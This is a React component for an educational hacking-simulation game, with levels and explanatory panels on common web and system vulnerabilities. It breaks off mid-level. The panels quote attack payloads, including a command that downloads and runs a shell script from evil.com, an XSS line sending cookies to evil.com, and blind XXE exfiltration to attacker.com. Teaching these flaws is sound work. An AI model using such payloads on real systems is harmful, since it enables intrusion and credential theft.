"use client";

import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal,
  Lock,
  Shield,
  AlertTriangle,
  CheckCircle,
  Eye,
  EyeOff,
  Zap,
  Key,
  Database,
  Globe,
  FileText,
  Cpu,
  Wifi,
  Hash,
  Server,
  Code,
  Network,
  Bug,
  Info,
  X,
  ChevronRight,
  Award,
  Layers,
  Cloud,
  HardDrive,
  Activity,
  Fingerprint,
} from 'lucide-react';

/*
 * OkayHacker Game Page
 *
 * This component implements a full featured terminal hacking simulation with
 * enhanced visuals, responsive layout, and additional levels. Import it
 * into your Next.js project under app/arcade/okayhacker/page.tsx and link it
 * from your arcade index. The game uses TailwindCSS for styling and the
 * lucide-react icon set. Ensure these dependencies are available.
 */

const OkayHackerGame = () => {
  const [currentLevel, setCurrentLevel] = useState(0);
  const [gameStarted, setGameStarted] = useState(false);
  const [terminalOutput, setTerminalOutput] = useState<any[]>([]);
  const [userInput, setUserInput] = useState('');
  const [score, setScore] = useState(0);
  const [hints, setHints] = useState(0);
  const [showHint, setShowHint] = useState(false);
  const [levelCompleted, setLevelCompleted] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [gameCompleted, setGameCompleted] = useState(false);
  const [unlockedAchievements, setUnlockedAchievements] = useState<string[]>([]);
  const [showLevelModal, setShowLevelModal] = useState(false);
  const [levelStartTime, setLevelStartTime] = useState<number | null>(null);
  const [terminalHistory, setTerminalHistory] = useState<string[]>([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [typingEffect, setTypingEffect] = useState('');
  const [isTyping, setIsTyping] = useState(false);
  const inputRef = useRef<HTMLInputElement | null>(null);
  const terminalRef = useRef<HTMLDivElement | null>(null);

  // Obfuscated solutions to prevent dev tools inspection
  const getSolution = (levelId: number) => {
    const encoded: Record<number, string> = {
      1: 'YWRtaW46cGFzc3dvcmQ=',
      2: 'YWRtaW4nIC0t',
      3: 'MTI3LjAuMC4xOyBscw==',
      4: 'PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmNvb2tpZSk+',
      5: 'Li4vLi4vLi4vZXRjL3NoYWRvdw==',
      6: 'eyJhZG1pbiI6dHJ1ZX0=',
      7: 'L2FwaS91c2Vycy8xMzM3',
      8: 'QUFBQUFBQUFBQUFBQUFBQQ==',
      9: 'ZXhhbXBsZS5jb20gQSA2LjYuNi42',
      10: 'Q29va2llOiBzZXNzaW9uPVNJRC1BRE1JTi0yMDI0LVNFQ1VSRQ==',
      11: 'PCFET0NUWVBFIHggWzwhRU5USVRZIGZpbGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPl0+',
      12: 'VFJBTlNGRVImJlRSQU5TRkVS',
      13: 'c2stMHhERUFEQkVFRg==',
      14: 'PHNjcmlwdD5mZXRjaCgnL3RyYW5zZmVyP3RvPWF0dGFja2VyJyk8L3NjcmlwdD4=',
      15: 'MTAuMC4wLjEvLi4vLi4vYWRtaW4=',
      16: 'YWRtaW5fdG9rZW49ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKdWIyNWxJbjAuZXlKaFpHMXBiaUk2ZEhKMVpYMD4=',
      17: 'U0VUIEBAdmVyc2lvbl9jb21tZW50PSNQV05FRA==',
    };
    return atob(encoded[levelId]);
  };

  // Level definitions
  const levels = [
    {
      id: 1,
      name: 'Weak Authentication',
      icon: <Key className="w-5 h-5" />,
      difficulty: 'Novice',
      category: 'Authentication',
      description: 'Default credentials vulnerability',
      objective: 'Access the admin panel using default credentials',
      hints: [
        'Default credentials often follow patterns like admin:admin or admin:password',
        'Try common combinations with ‘admin’ as the username',
        'Format is username:password - the password is a common English word',
      ],
      instruction:
        "$ ssh admin@10.0.0.1\n[!] Authentication required\nEnter credentials (format: username:password):",
      modalContent: {
        title: 'Default Credentials & Weak Authentication',
        description:
          'Default credentials are pre-configured username/password combinations that come with software, hardware, or services out of the box. These represent one of the most critical security vulnerabilities because they’re publicly documented and easily discoverable. Studies show that over 60% of data breaches involve weak or stolen credentials.',
        technical:
          'Authentication mechanisms validate user identity. Common weaknesses include: hardcoded credentials in source code, default accounts that aren’t disabled, weak password policies, and lack of account lockout mechanisms. Attackers use automated tools to try thousands of common credential combinations per second.',
        when:
          'Exploited in: IoT devices (cameras, routers), database management systems (MySQL, PostgreSQL), enterprise applications (Tomcat, Jenkins), network equipment (switches, firewalls), and embedded systems. Shodan.io indexes millions of devices still using default credentials.',
        example:
          'Common defaults include: admin/admin, root/toor, administrator/password, guest/guest, sa/sa (SQL Server), postgres/postgres, tomcat/tomcat. Many devices use the MAC address or serial number as the default password.',
        impact:
          'Can lead to complete system compromise, data theft, ransomware deployment, or using the device as part of a botnet.',
        prevention:
          'Force password changes on first login, implement strong password policies, disable default accounts, use multi-factor authentication, and regularly audit user accounts.',
      },
      learning:
        '💡 Always change default credentials immediately! Use unique, complex passwords and enable MFA.',
    },
    {
      id: 2,
      name: 'SQL Injection',
      icon: <Database className="w-5 h-5" />,
      difficulty: 'Beginner',
      category: 'Injection',
      description: 'Database query manipulation',
      objective: 'Bypass login authentication using SQL injection',
      hints: [
        'SQL comments (–) can terminate the rest of a query',
        'The apostrophe closes the username string early',
        "Try: admin’ followed by SQL comment syntax",
      ],
      instruction:
        "$ SELECT * FROM users WHERE username=’[INPUT]’ AND password=’…’",
      modalContent: {
        title: 'SQL Injection (SQLi) - OWASP #3',
        description:
          'SQL injection occurs when untrusted data is sent to an interpreter as part of a command or query. Attackers can trick the interpreter into executing unintended commands or accessing data without proper authorization. It’s been in the OWASP Top 10 since its inception and remains one of the most dangerous web vulnerabilities.',
        technical:
          'SQL injection exploits occur when user input is concatenated directly into SQL queries without proper sanitization or parameterization. Types include: Classic SQLi (error-based), Blind SQLi (boolean-based or time-based), Union-based SQLi, and Second-order SQLi. Modern ORMs have reduced but not eliminated this risk.',
        when:
          'Found in: login forms, search functions, product pages, user profiles, admin panels, reporting features, and anywhere user input interacts with databases. Both GET and POST parameters can be vulnerable, as well as HTTP headers and cookies.',
        example:
          "Payloads like ’ OR ‘1’=‘1’ – make conditions always true. UNION SELECT can extract data from other tables. Time-based blind SQLi uses SLEEP() or WAITFOR DELAY to infer data. Stacked queries (; DROP TABLE users–) can destroy data.",
        impact:
          'Authentication bypass, data exfiltration, data manipulation, complete database compromise, lateral movement to OS through xp_cmdshell or similar functions.',
        prevention:
          'Use parameterized queries/prepared statements, stored procedures, input validation, least privilege database accounts, and disable dangerous functions. Modern frameworks provide built-in protections when used correctly.',
      },
      learning:
        '💡 Never concatenate user input into queries! Use parameterized statements and principle of least privilege.',
    },
    {
      id: 3,
      name: 'Command Injection',
      icon: <Terminal className="w-5 h-5" />,
      difficulty: 'Beginner',
      category: 'Injection',
      description: 'OS command execution vulnerability',
      objective: 'Execute system commands through vulnerable input',
      hints: [
        'Chain commands using semicolon (;) in Unix/Linux',
        'The app expects an IP but doesn’t validate special characters',
        'Try: 127.0.0.1; ls to list directory contents',
      ],
      instruction:
        "$ ping -c 3 [INPUT]\n[!] Network diagnostic tool v2.1",
      modalContent: {
        title: 'OS Command Injection - Critical Vulnerability',
        description:
          'Command injection vulnerabilities allow attackers to execute arbitrary operating system commands on the server running an application. This typically occurs when an application passes unsafe user-supplied data to system shells. It’s one of the most severe vulnerabilities as it can lead to complete server compromise.',
        technical:
          'Command injection occurs when applications use system(), exec(), eval() or similar functions with user input. Command separators like ;, &&, ||, |, \n, and \r\n can chain multiple commands. In Windows, & and | are common separators. Backticks ` and $() can be used for command substitution in Unix shells.',
        when:
          'Common in: network administration tools (ping, traceroute, nslookup), file processing utilities, backup scripts, PDF generators, image processors, and system monitoring dashboards. Any feature that interacts with the OS is potentially vulnerable.',
        example:
          "Injections like ‘127.0.0.1; cat /etc/passwd’ expose sensitive files. ‘127.0.0.1 && wget http://evil.com/shell.sh && sh shell.sh’ can download and execute malware. Blind command injection uses time delays or DNS lookups to confirm execution.",
        impact:
          'Complete system compromise, data theft, malware installation, lateral network movement, cryptocurrency mining, or using the server for further attacks.',
        prevention:
          'Avoid system calls with user input, use language-specific APIs instead of shell commands, implement strict input validation using allowlists, use least privilege accounts, and containerize applications.',
      },
      learning:
        '💡 Never pass user input to system commands! Use built-in library functions and strict validation.',
    },
    {
      id: 4,
      name: 'XSS Payload',
      icon: <Globe className="w-5 h-5" />,
      difficulty: 'Intermediate',
      category: 'Injection',
      description: 'Cross-site scripting injection',
      objective: 'Inject JavaScript to steal cookies using an image tag',
      hints: [
        'Image tags can execute JavaScript via onerror events',
        'When image fails to load, onerror triggers',
        'Structure: <img src=x onerror=alert(document.cookie)>',
      ],
      instruction:
        "$ POST /comment\nContent-Type: text/html\n[!] Comment system v3.2\nEnter comment:",
      modalContent: {
        title: 'Cross-Site Scripting (XSS) - OWASP #2',
        description:
          'XSS flaws occur when applications include untrusted data in web pages without proper validation or escaping. XSS allows attackers to execute scripts in victims’ browsers, hijacking sessions, defacing websites, or redirecting users to malicious sites. It affects 2 out of 3 web applications.',
        technical:
          'Three main types: Reflected XSS (non-persistent, via URL parameters), Stored XSS (persistent, saved in database), and DOM-based XSS (client-side). Modern variants include mutation XSS (mXSS) and blind XSS. Payloads bypass filters using encoding (URL, HTML, Unicode), case variations, and browser quirks.',
        when:
          'Vulnerable areas: comment sections, user profiles, search results, error messages, chat applications, email displays, JSON endpoints rendered as HTML, file uploads (SVG, HTML), and markdown renderers. Both input and output contexts matter.',
        example:
          "Basic: <script>alert(1)</script>. Event handlers: <img src=x onerror=alert(1)>. Without script tags: <svg onload=alert(1)>. Filter bypasses: <ScRiPt>alert(1)</ScRiPt>. Stealing cookies: fetch('http://evil.com?c='+document.cookie). Keyloggers, cryptocurrency miners, and credential harvesters use XSS.",
        impact:
          'Session hijacking, account takeover, phishing, keylogging, cryptocurrency mining, defacement, or delivering malware. Stored XSS can create worms that self-propagate.',
        prevention:
          'Context-aware output encoding, Content Security Policy (CSP) headers, input validation, HTTPOnly cookie flags, modern frameworks with auto-escaping, and regular security testing.',
      },
      learning:
        '💡 Always encode output and implement CSP! Never trust user input, even from authenticated users.',
    },
    {
      id: 5,
      name: 'Path Traversal',
      icon: <FileText className="w-5 h-5" />,
      difficulty: 'Intermediate',
      category: 'Broken Access Control',
      description: 'Directory traversal attack',
      objective:
        'Access the system’s shadow file containing password hashes',
      hints: [
        'Use ../ sequences to navigate up directories',
        'The shadow file is located in /etc/ directory',
        'You need exactly three ../ to reach the root',
      ],
      instruction:
        "$ GET /files/[INPUT]\n[!] File Server v1.0\nCurrent directory: /var/www/files/",
      modalContent: {
        title:
          'Path/Directory Traversal - OWASP #1 (Broken Access Control)',
        description:
          'Path traversal vulnerabilities allow attackers to access files and directories outside the web root folder. By manipulating file paths with sequences like ‘../’, attackers can navigate the server’s directory structure and access sensitive files like configuration files, source code, or system files.',
        technical:
          'Traversal sequences include: ../ (Unix/Linux), ..\\ (Windows), URL encoded versions (%2e%2e%2f), double URL encoding (%252e%252e%252f), and Unicode encoding. Some applications strip ../ once, so ….// becomes ../ after filtering. Null bytes (%00) historically bypassed extension checks.',
        when:
          'Vulnerable features: file download/upload systems, template engines, include() functions, image galleries, document viewers, backup/restore functions, and log viewers. Both filesystem and URL paths can be vulnerable.',
        example:
          'Common targets: /etc/passwd (user accounts), /etc/shadow (password hashes), .env files (API keys), wp-config.php (WordPress credentials), web.config/applicationHost.config (IIS), id_rsa (SSH keys). Windows: C:\\Windows\\System32\\config\\SAM (password hashes).',
        impact:
          'Source code disclosure, sensitive data exposure, credentials theft, configuration manipulation, or remote code execution if combined with file upload vulnerabilities.',
        prevention:
          'Use indirect object references (database IDs), chroot jails, strict input validation with allowlists, disable directory listing, and run applications with minimal privileges.',
      },
      learning:
        '💡 Never use user input directly in file paths! Use indirect references and proper access controls.',
    },
    {
      id: 6,
      name: 'JWT Manipulation',
      icon: <Hash className="w-5 h-5" />,
      difficulty: 'Intermediate',
      category: 'Cryptographic Failures',
      description: 'Weak JWT implementation',
      objective:
        'Decode this Base64 JWT payload: eyJhZG1pbiI6dHJ1ZX0=',
      hints: [
        'JWT tokens have header.payload.signature parts',
        'This is just the payload portion, Base64 encoded',
        'Decode it to see the JSON object inside',
      ],
      instruction:
        "$ jwt_decoder –token [INPUT]\n[!] JWT Validator v2.0\nEnter decoded payload:",
      modalContent: {
        title: 'JWT Vulnerabilities & Cryptographic Failures - OWASP #2',
        description:
          'JSON Web Tokens (JWT) are widely used for authentication but often implemented insecurely. Common flaws include accepting unsigned tokens, weak secrets, algorithm confusion attacks, and lack of expiration. Cryptographic failures expose sensitive data through weak encryption, improper key management, or flawed implementations.',
        technical:
          'JWT structure: header.payload.signature. Vulnerabilities include: algorithm substitution (RS256 to HS256), none algorithm acceptance, weak HMAC secrets (brute-forceable), key injection, JKU/X5U URL manipulation, and kid (key ID) SQL injection. Tools like jwt_tool and PyJWT help identify these flaws.',
        when:
          'Found in: REST APIs, single sign-on (SSO) systems, mobile app authentication, microservices communication, and session management. Both authorization headers and cookies can carry JWTs.',
        example:
          "Changing alg:RS256 to alg:HS256 treats public key as HMAC secret. Setting alg:none removes signature verification. Weak secrets like ‘secret’ or ‘key’ are crackable in seconds. Modifying payload claims like ‘admin’:false to ‘admin’:true grants privileges.",
        impact:
          'Authentication bypass, privilege escalation, account takeover, sensitive data exposure, and lateral movement across services sharing the same secret.',
        prevention:
          'Use strong, rotated secrets (256+ bits), validate algorithm strictly, check token expiration and issuer, use JWK for key management, implement proper token revocation, and consider using refresh tokens.',
      },
      learning:
        '💡 Always validate JWT signatures and algorithms! Use strong secrets and implement proper expiration.',
    },
    {
      id: 7,
      name: 'IDOR Exploit',
      icon: <Server className="w-5 h-5" />,
      difficulty: 'Intermediate',
      category: 'Broken Access Control',
      description: 'Insecure Direct Object Reference',
      objective:
        'Access user ID 1337’s profile (you are user 1000)',
      hints: [
        'The API uses predictable patterns for user resources',
        'Simply change your user ID to the target ID',
        'API endpoint format: /api/users/[ID]',
      ],
      instruction:
        "$ curl https://api.target.com/[INPUT]\n[!] API Gateway v4.1\nYour user ID: 1000",
      modalContent: {
        title:
          'Insecure Direct Object References (IDOR) - Access Control Flaw',
        description:
          'IDOR vulnerabilities occur when applications expose direct references to internal objects (database keys, filenames) without proper access control checks. Attackers can manipulate these references to access unauthorized data. It’s one of the most common vulnerabilities in modern APIs.',
        technical:
          'IDOR exploits predictable patterns in: numeric IDs (user/1234), UUIDs, filenames (document1.pdf), API endpoints, and database keys. Modern applications often use GraphQL, REST APIs, or microservices where authorization checks are forgotten or implemented inconsistently.',
        when:
          'Vulnerable endpoints: user profiles (/user/123), documents (/download?id=456), invoices (/invoice/789), messages (/chat/message/321), API resources (/api/v1/orders/654), and admin functions. Both horizontal (user-to-user) and vertical (privilege escalation) access violations occur.',
        example:
          'Changing /api/user/1000/profile to /api/user/1001/profile accesses another user’s data. Mass data extraction using incremental IDs. Combining with other flaws: IDOR + XSS = worm, IDOR + CSRF = forced actions.',
        impact:
          'Data breaches, privacy violations, financial theft, corporate espionage, compliance violations (GDPR, HIPAA), and reputation damage.',
        prevention:
          'Use random, unpredictable identifiers (UUIDs), implement proper authorization checks for every request, use indirect object references, apply the principle of least privilege, and log access attempts.',
      },
      learning:
        '💡 Always verify user authorization for every resource! Don’t rely on obscurity.',
    },
    {
      id: 8,
      name: 'Buffer Overflow',
      icon: <Bug className="w-5 h-5" />,
      difficulty: 'Advanced',
      category: 'Memory Corruption',
      description: 'Stack-based buffer overflow',
      objective:
        'Overflow the 8-byte buffer with exactly 16 ‘A’ characters',
      hints: [
        'Buffer size is 8 bytes, overflow with double that',
        'Send a string of 16 capital ‘A’ characters',
        'Pattern: AAAAAAAAAAAAAAAA (16 A’s)',
      ],
      instruction:
        "$ ./vulnerable_app –input [INPUT]\n[!] Buffer size: 8 bytes\n[!] Stack canary: disabled",
      modalContent: {
        title: 'Buffer Overflow - Memory Corruption Vulnerability',
        description:
          'Buffer overflows occur when programs write more data to a buffer than it can hold, corrupting adjacent memory. This can crash programs, corrupt data, or allow attackers to execute arbitrary code. Despite modern protections, buffer overflows remain relevant, especially in embedded systems and legacy applications.',
        technical:
          'Types include: stack-based (overwrite return addresses), heap-based (corrupt heap metadata), integer overflows (cause buffer overflows), and format string bugs. Exploitation involves overwriting instruction pointers, injecting shellcode, or using Return-Oriented Programming (ROP) chains to bypass DEP/NX.',
        when:
          'Common in: C/C++ applications, embedded systems, kernel drivers, network services, legacy applications, IoT devices, and industrial control systems. Functions like strcpy(), gets(), sprintf() are particularly dangerous.',
        example:
          'Classic overflow: sending 100 bytes to 50-byte buffer. EIP overwrite: padding + address of shellcode. ROP chains: reuse existing code snippets. Heap spray: fill memory with shellcode. Modern exploits bypass ASLR using information leaks.',
        impact:
          'Remote code execution, privilege escalation, denial of service, data corruption, or complete system compromise. Kernel-level overflows are especially severe.',
        prevention:
          'Use memory-safe languages (Rust, Go), enable compiler protections (stack canaries, DEP/NX, ASLR), use safe functions (strncpy vs strcpy), perform bounds checking, and fuzz test applications.',
      },
      learning:
        '💡 Use memory-safe languages and functions! Enable all compiler security features.',
    },
    {
      id: 9,
      name: 'DNS Poisoning',
      icon: <Network className="w-5 h-5" />,
      difficulty: 'Advanced',
      category: 'Network Security',
      description: 'DNS cache poisoning attack',
      objective:
        'Poison DNS to redirect example.com to IP 6.6.6.6',
      hints: [
        'DNS A records map domain names to IP addresses',
        'Format: domain_name A ip_address',
        'Exact format: example.com A 6.6.6.6',
      ],
      instruction:
        "$ dns_inject –record [INPUT]\n[!] DNS Cache Manager v3.0\nInject DNS record:",
      modalContent: {
        title: 'DNS Cache Poisoning - Network Layer Attack',
        description:
          'DNS cache poisoning (spoofing) corrupts DNS resolver caches, causing name servers to return incorrect IP addresses. This diverts traffic to attacker-controlled servers, enabling phishing, malware distribution, and man-in-the-middle attacks. Despite DNSSEC, many domains remain vulnerable.',
        technical:
          'Attack vectors: birthday attacks on transaction IDs, Kaminsky attack (poisoning entire domains), fragmentation attacks, and exploiting weak randomization. Attackers race legitimate responses, exploiting predictable query IDs, source ports, or timing. BGP hijacking and registrar attacks achieve similar results.',
        when:
          'Targets: recursive DNS resolvers, ISP DNS servers, corporate DNS infrastructure, and router DNS caches. Vulnerable during: high query loads, DDoS attacks (when defenses are weakened), or via compromised routers.',
        example:
          'Redirecting bank.com to phishing site, injecting malware via fake software updates, NSA’s QUANTUM attacks, Great Firewall DNS injection, and cryptocurrency wallet redirections. Cache poisoning can persist for days (TTL values).',
        impact:
          'Large-scale phishing, malware distribution, credential theft, cryptocurrency theft, censorship, and destroying trust in DNS infrastructure.',
        prevention:
          'Deploy DNSSEC validation, use random source ports and transaction IDs, implement 0x20 bit encoding, use DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT), and monitor for suspicious DNS changes.',
      },
      learning:
        '💡 Implement DNSSEC and use encrypted DNS! Monitor DNS responses for anomalies.',
    },
    {
      id: 10,
      name: 'Session Hijacking',
      icon: <Wifi className="w-5 h-5" />,
      difficulty: 'Advanced',
      category: 'Authentication',
      description: 'Session token theft and replay',
      objective:
        'Use stolen session: Cookie: session=SID-ADMIN-2024-SECURE',
      hints: [
        'HTTP cookies carry session tokens in requests',
        'Headers format: Cookie: name=value',
        'Full format: Cookie: session=SID-ADMIN-2024-SECURE',
      ],
      instruction:
        "$ curl -H ‘[INPUT]’ https://target.com/admin\n[!] Session Manager v5.2",
      modalContent: {
        title: 'Session Hijacking - Authentication Bypass',
        description:
          'Session hijacking involves stealing or predicting valid session tokens to impersonate legitimate users. Attackers gain unauthorized access without knowing credentials. With sessions lasting hours or days, a single stolen token provides persistent access.',
        technical:
          'Attack methods: XSS (stealing cookies via JavaScript), network sniffing (unencrypted connections), MITM attacks, session fixation (forcing known session IDs), and prediction (weak randomness). Modern attacks use browser exploitation, malicious extensions, or SS7 vulnerabilities for SMS-based 2FA bypass.',
        when:
          'Vulnerable scenarios: HTTP sites (no encryption), missing Secure flag on cookies, absent HttpOnly flag (XSS vulnerable), predictable session IDs, sessions not regenerated after login, and long session timeouts.',
        example:
          'document.cookie exfiltration via XSS, Wireshark capture on public WiFi, predictable PHPSESSID values, session fixation via URL parameters, and cookie jar overflow attacks. Tools: Burp Suite, OWASP ZAP, Firesheep (historical).',
        impact:
          'Account takeover, financial fraud, data theft, privilege escalation, and persistent access to sensitive systems.',
        prevention:
          'Use HTTPS everywhere, set Secure and HttpOnly cookie flags, implement SameSite attributes, regenerate sessions after authentication, use short timeouts, implement device fingerprinting, and monitor for anomalous session usage.',
      },
      learning:
        '💡 Always use HTTPS and secure cookie flags! Regenerate sessions after login.',
    },
    {
      id: 11,
      name: 'XXE Injection',
      icon: <Code className="w-5 h-5" />,
      difficulty: 'Expert',
      category: 'Injection',
      description: 'XML External Entity attack',
      objective:
        'Read /etc/passwd using XXE in DOCTYPE declaration',
      hints: [
        'XXE uses DOCTYPE to define external entities',
        'SYSTEM entities can read local files',
        'Structure: <!DOCTYPE x [<!ENTITY file SYSTEM "file:///etc/passwd">]>',
      ],
      instruction:
        "$ POST /xml-parser\nContent-Type: application/xml\n[!] XML Processor v2.1",
      modalContent: {
        title: 'XML External Entity (XXE) Injection - OWASP #5',
        description:
          'XXE vulnerabilities exploit XML parsers that process external entity references within XML documents. Attackers can read local files, perform SSRF attacks, cause denial of service, or achieve remote code execution. Despite JSON’s popularity, XML remains common in enterprise systems, making XXE highly relevant.',
        technical:
          'XXE exploits DTD (Document Type Definition) processing. Attack types: classic XXE (direct file read), blind XXE (out-of-band data exfiltration), error-based XXE, and XXE-based SSRF. Billion laughs attack causes DoS. Parameter entities and external DTDs bypass restrictions.',
        when:
          'Vulnerable systems: SOAP web services, REST APIs accepting XML, SAML authentication, XML configuration parsers, Office document processors (DOCX, XLSX), SVG image processors, and legacy enterprise systems.',
        example:
          "File disclosure: <!ENTITY xxe SYSTEM 'file:///etc/passwd'>. SSRF: <!ENTITY xxe SYSTEM 'http://internal-server'>. Blind XXE: <!ENTITY % xxe SYSTEM 'http://attacker.com/?data='> exfiltrates via DNS/HTTP. RCE via expect:// or PHP wrappers.",
        impact:
          'Sensitive file disclosure, internal network scanning, denial of service, SSRF attacks, and potential remote code execution.',
        prevention:
          'Disable DTD processing entirely, disable external entities, use less complex formats (JSON), validate and sanitize XML input, and keep XML processors updated.',
      },
      learning:
        '💡 Disable external entity processing! Consider using JSON instead of XML.',
    },
    {
      id: 12,
      name: 'Race Condition',
      icon: <Zap className="w-5 h-5" />,
      difficulty: 'Expert',
      category: 'Business Logic',
      description: 'TOCTOU vulnerability exploitation',
      objective:
        'Transfer $1000 twice simultaneously: TRANSFER&&TRANSFER',
      hints: [
        'Execute two operations before balance check',
        'Use && to run commands in parallel',
        'Command: TRANSFER&&TRANSFER',
      ],
      instruction:
        "$ bank_transfer –amount 1000 –balance 1000\n[!] Banking System v8.3\nCommand:",
      modalContent: {
        title: 'Race Condition / TOCTOU - Concurrency Vulnerability',
        description:
          'Race conditions occur when multiple processes access shared resources simultaneously without proper synchronization. Time-of-check to time-of-use (TOCTOU) vulnerabilities happen when resource states change between checking and using them. These bugs are subtle, hard to detect, and can have severe consequences.',
        technical:
          'Types: TOCTOU (file system races), double-spending (financial systems), privilege escalation races, and deadlocks. Exploitation requires precise timing, often using multiple threads, processes, or network requests. Modern multi-core systems and distributed architectures increase race condition likelihood.',
        when:
          'Vulnerable operations: financial transactions, file operations, authentication checks, coupon/voucher redemption, inventory management, and voting systems. Microservices and serverless architectures introduce new race condition vectors.',
        example:
          'Double withdrawal: two simultaneous $1000 withdrawals from $1000 balance. Symlink races: TOCTOU between stat() and open(). Authentication races: changing privileges during login. Coupon stacking: applying same discount multiple times.',
        impact:
          'Financial loss, data corruption, privilege escalation, business logic bypass, and system instability.',
        prevention:
          'Use atomic operations, implement proper locking (mutex, semaphores), use database transactions with proper isolation levels, implement idempotency keys, and use optimistic/pessimistic locking strategies.',
      },
      learning:
        '💡 Use atomic operations and proper locking! Test concurrent scenarios thoroughly.',
    },
    {
      id: 13,
      name: 'API Key Exposure',
      icon: <Key className="w-5 h-5" />,
      difficulty: 'Expert',
      category: 'Security Misconfiguration',
      description: 'Exposed credentials in source',
      objective:
        'Find exposed API key: sk-0xDEADBEEF (check HTML comments)',
      hints: [
        'Developers often leave sensitive data in comments',
        'The key starts with ‘sk-’ prefix',
        'Contains hexadecimal: 0xDEADBEEF',
      ],
      instruction:
        "$ view-source https://app.target.com\n<!-- API: ??? -->\n[!] Extract the API key:",
      modalContent: {
        title:
          'API Key & Secret Exposure - OWASP #5 (Security Misconfiguration)',
        description:
          'API keys, passwords, and secrets exposed in code, repositories, or client-side applications represent a critical security failure. With cloud services and SaaS proliferation, a single exposed key can compromise entire infrastructures. GitHub alone discovers thousands of exposed secrets daily.',
        technical:
          'Common locations: JavaScript source code, mobile app binaries, public repositories, configuration files, error messages, HTML comments, API documentation, and browser developer tools. Secrets include: API keys, OAuth tokens, JWT secrets, database credentials, encryption keys, and webhook URLs.',
        when:
          'Exposed via: Git commits (even deleted ones), client-side JavaScript, mobile apps (decompiled), public CDNs, misconfigured S3 buckets, Docker images, CI/CD logs, and Stack Overflow posts.',
        example:
          'AWS keys in .git folders, Google API keys in Android apps, Stripe keys in React builds, database passwords in wp-config.php, private keys in Dockerfiles, and tokens in browser localStorage. Tools like TruffleHog, GitLeaks, and GitHub secret scanning find these automatically.',
        impact:
          'Financial loss (cloud resource abuse), data breaches, service disruption, cryptocurrency theft, and supply chain attacks.',
        prevention:
          'Use environment variables, secret management systems (HashiCorp Vault, AWS Secrets Manager), rotate keys regularly, implement least privilege, use .gitignore properly, and scan repositories for secrets.',
      },
      learning:
        '💡 Never commit secrets! Use environment variables and secret management systems.',
    },
    {
      id: 14,
      name: 'Chained XSS-CSRF',
      icon: <Shield className="w-5 h-5" />,
      difficulty: 'Master',
      category: 'Complex Attack Chain',
      description: 'Combined XSS and CSRF attack',
      objective:
        "Chain XSS with CSRF: <script>fetch('/transfer?to=attacker')</script>",
      hints: [
        'XSS executes JavaScript in victim’s browser',
        'Use fetch() to make authenticated requests',
        'Target endpoint: /transfer?to=attacker',
      ],
      instruction:
        "$ POST /profile/bio\n[!] Profile Editor v6.0\nBio update:",
      modalContent: {
        title: 'Chained Vulnerabilities - Advanced Attack Patterns',
        description:
          'Real-world attacks rarely exploit single vulnerabilities. Attackers chain multiple flaws to achieve maximum impact. XSS+CSRF combination bypasses CSRF protections, as the malicious script runs in the legitimate origin context. Understanding attack chains is crucial for effective defense.',
        technical:
          'Common chains: XSS→CSRF (bypass same-origin policy), SQLi→RCE (read files containing credentials), SSRF→RCE (access internal services), IDOR→Account Takeover→Data Breach. Each vulnerability enables the next, creating devastating attack paths.',
        when:
          'Advanced persistent threats (APTs), targeted attacks, bug bounty hunters demonstrating impact, and automated attack tools. Modern frameworks make single vulnerabilities harder to exploit but chains remain effective.',
        example:
          "XSS steals CSRF token → CSRF changes email → password reset → account takeover. Upload SVG with XSS → steal admin session → upload web shell → RCE. SSRF to cloud metadata → steal IAM credentials → full cloud compromise.",
        impact:
          'Complete system compromise, massive data breaches, persistent access, and cascading failures across connected systems.',
        prevention:
          'Defense in depth, assume breach mentality, implement multiple security layers, regular penetration testing, and security awareness training.',
      },
      learning:
        '💡 Implement defense in depth! One vulnerability can enable many others.',
    },
    {
      id: 15,
      name: 'SSRF Attack',
      icon: <Cloud className="w-5 h-5" />,
      difficulty: 'Expert',
      category: 'Injection',
      description: 'Server-Side Request Forgery',
      objective:
        'Access internal admin panel via SSRF: 10.0.0.1/../../admin',
      hints: [
        'SSRF allows requests to internal networks',
        'Combine internal IP with path traversal',
        'Format: 10.0.0.1/../../admin',
      ],
      instruction:
        "$ POST /url-fetcher\n[!] URL Fetcher v3.1\nFetch URL:",
      modalContent: {
        title: 'Server-Side Request Forgery (SSRF) - OWASP #10',
        description:
          'SSRF vulnerabilities allow attackers to make requests from the vulnerable server to internal or external resources. This bypasses firewalls, accesses internal services, and potentially compromises cloud infrastructure through metadata endpoints. SSRF has become critical with cloud adoption.',
        technical:
          'Attack vectors: URL parameters, webhooks, PDF generators, image processors, and proxy services. Targets include: internal services (localhost, 127.0.0.1, 10.x.x.x, 172.16.x.x, 192.168.x.x), cloud metadata (169.254.169.254), and external services for port scanning. Bypasses use alternative IP representations, DNS rebinding, and redirect chains.',
        when:
          'Vulnerable features: webhooks, file downloads from URLs, PDF generation from HTML, image processing from URLs, link preview generation, and proxy functionality. Cloud environments are especially vulnerable due to metadata services.',
        example:
          'AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/. Internal services: http://localhost:8080/admin. Port scanning: iterating through http://internal-host:1-65535. Blind SSRF uses DNS lookups or timing for confirmation.',
        impact:
          'Cloud account takeover, internal network access, sensitive data exposure, remote code execution on internal services, and denial of service.',
        prevention:
          'Whitelist allowed protocols and domains, blacklist private IP ranges, disable unnecessary URL schemas, use separate networks for sensitive services, and disable cloud metadata endpoints.',
      },
      learning:
        '💡 Validate and whitelist URLs! Isolate internal services from application servers.',
    },
    {
      id: 16,
      name: 'Insecure Deserialization',
      icon: <HardDrive className="w-5 h-5" />,
      difficulty: 'Master',
      category: 'Injection',
      description: 'Object injection via cookies',
      objective:
        'Inject admin token in cookie: admin_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0>',
      hints: [
        'The cookie contains a tampered JWT token',
        "Algorithm is set to ‘none’ (no signature required)",
        'Cookie format: admin_token=[base64_jwt]',
      ],
      instruction:
        "$ GET /dashboard\nCookie: [INPUT]\n[!] Session Handler v7.2",
      modalContent: {
        title: 'Insecure Deserialization - OWASP #8',
        description:
